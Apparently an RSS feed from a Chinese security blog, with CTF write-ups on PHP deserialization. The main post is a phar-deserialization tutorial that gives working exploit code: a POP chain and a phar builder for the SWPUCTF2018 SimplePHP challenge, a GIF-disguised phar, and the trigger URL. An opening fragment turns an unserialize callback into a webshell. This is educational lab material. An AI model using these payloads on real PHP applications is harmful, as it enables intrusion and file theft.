</span><span class="c1"></span><span class="nv">$string</span><span class="o">=</span><span class="s1">&#39;O:4:&#34;main&#34;:1:{s:1:&#34;a&#34;;O:8:&#34;settings&#34;:0:{}}&#39;</span><span class="p">;</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$string</span><span class="p">));</span>
</code></pre></div><p>思路是回调函数可控，调用回调函数时如果不存在就会报错，然后把函数设置为一句话即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505005235360.png" alt="image-20210505005235360"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505005919242.png" alt="image-20210505005919242"></p>
<p>看群里好像是有人为了防止<code>&lt;$</code>类似字符转义，多加了一个<code>html_errors=true</code>,结果导致被转义了&hellip;</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505010415279.png" alt="image-20210505010415279"></p>
<p>看来是这位师傅多此一举，事实上出题人确实可以用默认为转义模式，需要我们构造<code>html_errors=false</code>去反转义，也是一个思路。</p>
]]></content>
		</item>
		
		<item>
			<title>about the blog</title>
			<link>https://theoyu.top/posts/something/</link>
			<pubDate>Sat, 01 May 2021 07:01:59 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/something/</guid>
			<description>删了绝大多数之前博客,有技术性的,有碎碎叨叨的,但更多的是没有什么思考的wp。或许学的越多,看问题的角度越多,就越会对上一个阶段的自己不满意。在我看来之前的记录大多都是记流水帐似的任务,又或许是看了很多师傅的博客，想如果我也能总结出这样的文章，那我是不是也会变得像师傅这样厉害呢?
转眼就到了大二的尾巴,翻了翻之前大多数的博客,可能我缺少的是大师傅那样静下心来思考的毅力。不可否认web安全就是这样浮躁,东西杂轮子多,不加以思考的用别人的轮子去解决问题很难有所进步。让我感触最深的还是p神和飘零师傅,看他们从底层开始学习,哪怕一个简单细小的地方也可以总结出有深度的内容,这让我很是惭愧。几个月前的我还嚷嚷着我这辈子也不可能学java的,php的意义就是全是漏洞，golang天下第一调打c++，现在看来不过是对自己没有扎实基础的逃避，无论什么东西，存在即意义,或许我现在还不晚,还有足够的时间去捣鼓我喜欢做的事情。
最后,希望大家与博客战斗的同时,不要忘记——博客的初心是记录。
   2019-12-23——2020-11-17
博客园
  2020-11-17——2021-5-1
Typecho
  2021-5-1——Now
Hugo
  </description>
			<content type="html"><![CDATA[<p>删了绝大多数之前博客,有技术性的,有碎碎叨叨的,但更多的是没有什么思考的wp。或许学的越多,看问题的角度越多,就越会对上一个阶段的自己不满意。在我看来之前的记录大多都是记流水帐似的任务,又或许是看了很多师傅的博客，想如果我也能总结出这样的文章，那我是不是也会变得像师傅这样厉害呢?</p>
<p>转眼就到了大二的尾巴,翻了翻之前大多数的博客,可能我缺少的是大师傅那样静下心来思考的毅力。不可否认web安全就是这样浮躁,东西杂轮子多,不加以思考的用别人的轮子去解决问题很难有所进步。让我感触最深的还是p神和飘零师傅,看他们从底层开始学习,哪怕一个简单细小的地方也可以总结出有深度的内容,这让我很是惭愧。几个月前的我还嚷嚷着<strong>我这辈子也不可能学java的</strong>,<strong>php的意义就是全是漏洞</strong>，<strong>golang天下第一调打c++</strong>，现在看来不过是对自己没有扎实基础的逃避，无论什么东西，存在即意义,或许我现在还不晚,还有足够的时间去捣鼓我喜欢做的事情。</p>
<p>最后,希望大家与博客战斗的同时,不要忘记——博客的初心是记录。</p>
<hr>
<ul>
<li>
<p>2019-12-23——2020-11-17</p>
<p><a href="https://www.cnblogs.com/">博客园</a></p>
</li>
<li>
<p>2020-11-17——2021-5-1</p>
<p><a href="http://typecho.org/">Typecho</a></p>
</li>
<li>
<p>2021-5-1——Now</p>
<p><a href="https://gohugo.io/">Hugo</a></p>
</li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>利用 phar 拓展 php 反序列化漏洞攻击面</title>
			<link>https://theoyu.top/posts/phar/</link>
			<pubDate>Mon, 22 Feb 2021 11:19:11 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/phar/</guid>
			<description>phar文件结构 所有的Phar archives包含以下3-4个部分。
 a stub a manifest describing the contents the file contents [optional] a signature for verifying Phar integrity (phar file format only)  a stub 可以理解为一个标志，格式为xxx&amp;lt;?php xxx; __HALT_COMPILER();?&amp;gt;，前面内容不限，但必须以__HALT_COMPILER();?&amp;gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。通常使用setStub()设置存根。
a manifest phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，也是反序列化中我们可以利用的部分。
file contents 被压缩文件的内容。
a signature demo 通过一个简单案例创建phar文件，记住要把php.ini中的phar.readonly设置为Off。
&amp;lt;?php class TestObject { } @unlink(&amp;#34;phar.phar&amp;#34;); $phar = new Phar(&amp;#34;phar.phar&amp;#34;); //后缀名必须为phar  $phar-&amp;gt;setStub(&amp;#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;); //设置stub  $o = new TestObject(); $phar-&amp;gt;setMetadata($o); //将自定义的meta-data存入manifest  $phar-&amp;gt;addFile(&amp;#39;hack.php&amp;#39;);//添加要压缩的文件 ?&amp;gt;可以看到meta-data是以序列化的形式存储的：
有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：
   受影响函数列表        fileatime filectime file_exists file_get_contents   file_put_contents file filegroup fopen   fileinode filemtime fileowner fileperms   is_dir is_excutable is_file is_link   is_readable is_writable is_writeable parse_ini_file   copy unlink stat readfile    用一个小案例加以证明：</description>
			<content type="html"><![CDATA[<h2 id="phar文件结构">phar文件结构</h2>
<p>所有的<strong>Phar archives</strong>包含以下3-4个部分。</p>
<ol>
<li>a stub</li>
<li>a manifest describing the contents</li>
<li>the file contents</li>
<li>[optional] a signature for verifying Phar integrity (phar file format only)</li>
</ol>
<h3 id="a-stub">a stub</h3>
<p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。通常使用<code>setStub()</code>设置存根。</p>
<h3 id="a-manifest">a manifest</h3>
<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，也是反序列化中我们可以利用的部分。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-307317592.png" alt=""></p>
<h3 id="file-contents">file contents</h3>
<p>被压缩文件的内容。</p>
<h3 id="a-signature">a signature</h3>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-3050303077.png" alt=""></p>
<h2 id="demo">demo</h2>
<p>通过一个简单案例创建phar文件，记住要把<code>php.ini</code>中的<strong>phar.readonly</strong>设置为<strong>Off</strong>。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
    <span class="p">}</span>

    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar
</span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> <span class="c1">//设置stub
</span><span class="c1"></span>    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TestObject</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest
</span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFile</span><span class="p">(</span><span class="s1">&#39;hack.php&#39;</span><span class="p">);</span><span class="c1">//添加要压缩的文件
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>可以看到meta-data是以序列化的形式存储的：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-390463059.png" alt=""></p>
<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
<table>
<thead>
<tr>
<th>受影响函数列表</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_excutable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody>
</table>
<p>用一个小案例加以证明：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;destruct&#34;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;phar://phar.phar/hack.php&#39;</span><span class="p">;</span>
<span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>执行结果如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="err">$</span> <span class="nx">php</span> <span class="o">.</span><span class="nx">\phar_des</span><span class="o">.</span><span class="nx">php</span>
<span class="nx">destruct</span>
</code></pre></div><p>同时，phar可以伪装成任意格式文件，php识别phar文件是通过其文件头的<strong>stub</strong>，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对<strong>前面的内容</strong>或者<strong>后缀名</strong>是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
    <span class="p">}</span>
    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar
</span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;GIF89a&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> <span class="c1">//设置stub
</span><span class="c1"></span>    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TestObject</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest
</span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFile</span><span class="p">(</span><span class="s1">&#39;hack.php&#39;</span><span class="p">);</span><span class="c1">//添加要压缩的文件
</span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-3155836478.png" alt=""></p>
<p>即使把phar后缀修改，也不会影响利用。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;destruct&#34;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;phar://phar.gif/hack.php&#39;</span><span class="p">;</span>
<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>执行结果如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="err">$</span> <span class="nx">php</span> <span class="o">.</span><span class="nx">\phar_des</span><span class="o">.</span><span class="nx">php</span>
<span class="nx">destruct</span>
</code></pre></div><h2 id="利用实例">利用实例</h2>
<p>任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。</p>
<ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:,/,phar</code>等特殊字符没有被过滤。</li>
</ol>
<h3 id="swpuctf2018-simplephp">SWPUCTF2018 SimplePHP</h3>
<p>在查看文件处利用<code>?file</code>读取全部源代码,重点关注以下几处：
文件上传处的<code>function.php</code>有以下过滤：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">upload_file_check</span><span class="p">()</span> <span class="p">{</span> 
    <span class="k">global</span> <span class="nv">$_FILES</span><span class="p">;</span> 
    <span class="nv">$allowed_types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;gif&#34;</span><span class="p">,</span><span class="s2">&#34;jpeg&#34;</span><span class="p">,</span><span class="s2">&#34;jpg&#34;</span><span class="p">,</span><span class="s2">&#34;png&#34;</span><span class="p">);</span> 
    <span class="nv">$temp</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span> 
</code></pre></div><p>可以看到是白名单过滤，那上传这里做不了什么手脚，我们看看读取处。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;content-type:text/html;charset=utf-8&#34;</span><span class="p">);</span>  
<span class="k">include</span> <span class="s1">&#39;function.php&#39;</span><span class="p">;</span> 
<span class="k">include</span> <span class="s1">&#39;class.php&#39;</span><span class="p">;</span> 
<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/var/www/html/&#39;</span><span class="p">);</span> 
<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">;</span> 
<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
    <span class="k">echo</span> <span class="s2">&#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;</span><span class="p">;</span> 
<span class="p">}</span> 
<span class="nv">$show</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span> 
<span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span> 
    <span class="nv">$show</span><span class="o">-&gt;</span><span class="na">_show</span><span class="p">();</span> 
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span> 
    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;file doesn\&#39;t exists.&#39;</span><span class="p">);</span> 
<span class="p">}</span> 
<span class="cp">?&gt;</span><span class="err"> 
</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"> <span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">C1e4r</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">;</span>
        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Show</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>   <span class="c1">//$this-&gt;source = phar://phar.jpg
</span><span class="c1"></span>        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
        <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">_show</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">);</span>
        <span class="p">}</span>
        
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/http|https|file:|gopher|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&#34;hacker~&#34;</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">Test</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">file_get</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$text</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$value</span><span class="p">));</span>
        <span class="k">return</span> <span class="nv">$text</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>我们先关注有没有可以读取文件的地方，所有内容一共有两处：</p>
<ol>
<li><code>highlight_file($this-&gt;source);</code></li>
<li><code>$text = base64_encode(file_get_contents($value));</code></li>
</ol>
<p>跟进第一处发现有所过滤
<img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-10780885.png" alt=""></p>
<p><code>f1ag</code>被ban，无法读取，看另外一处。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2480299101.png" alt=""></p>
<p>在<code>get()</code>函数下发现有调用<code>file_get()</code>,<code>__get()</code>调用了<code>get()</code>，现在需要找到调用不可访问对象的地方。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2434843641.png" alt=""></p>
<p>只要把Test实例化的对象存储在str的数组中，然后再去调用source属性（即Test中不存在的属性），就可以触发<code>__get()</code>了。现在找一找把对象当作字符串处理的地方。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-1513267936.png" alt=""></p>
<p>不出意外的找到了，整个利用链也十分清晰。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">C1e4r</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Show</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">Test</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>

<span class="p">}</span>

<span class="nv">$demo1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">C1e4r</span><span class="p">();</span>
<span class="nv">$demo2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
<span class="nv">$demo3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
<span class="nv">$demo3</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/f1ag.php&#34;</span><span class="p">;</span><span class="c1">//目标文件
</span><span class="c1"></span><span class="nv">$demo2</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$demo3</span><span class="p">;</span>   <span class="c1">//触发__tostring
</span><span class="c1"></span><span class="nv">$demo1</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="nv">$demo2</span><span class="p">;</span>  <span class="c1">//触发__get;
</span><span class="c1"></span><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo1</span><span class="p">);</span>

<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;2.phar&#34;</span><span class="p">);</span> <span class="c1">//生成phar文件
</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$demo1</span><span class="p">);</span> <span class="c1">//触发头是C1e4r类
</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">//生成签名
</span><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>生成phar文件后，上传需要改后缀，然后直接读取即可。</p>
<pre><code class="language-url" data-lang="url">file.php?file=phar://./upload/c38d8861438aff49fb8385d9fd4df1e4.jpg
</code></pre><h2 id="最后">最后</h2>
<p>其实<code>phar</code>兴起也是最近几年的事，到后来hitcon一年一题..其实考点都差不多，难的地方也是和其他内容打组合拳，下面还有一些关于phar的题目，感兴趣可以去试试。</p>
<ul>
<li>CISCN2019 Dropbox</li>
<li>bytectf2019 ezcms</li>
<li>hitcon···</li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>浅谈php序列化与反序列化</title>
			<link>https://theoyu.top/posts/%E5%BA%8F%E5%88%97%E5%8C%96/</link>
			<pubDate>Mon, 09 Nov 2020 23:30:20 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
			<description>基础知识  现在我们都会在淘宝上买桌子，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。
也就是说，序列化的目的是方便传输和存储。
在PHP应用中，序列化和反序列化一般用做缓存，比如session，cookie等。
